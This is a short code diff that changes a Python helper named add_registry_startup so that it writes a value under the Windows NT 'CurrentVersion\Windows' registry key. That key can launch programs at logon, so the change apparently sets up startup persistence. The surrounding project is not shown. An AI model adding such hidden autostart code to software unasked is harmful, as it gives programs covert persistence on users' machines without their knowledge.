@@ -133,7 +133,7 @@ try {
     def add_registry_startup(path, name):
         import winreg
         
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\\Desktop", 0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
         winreg.CloseKey(key)
 
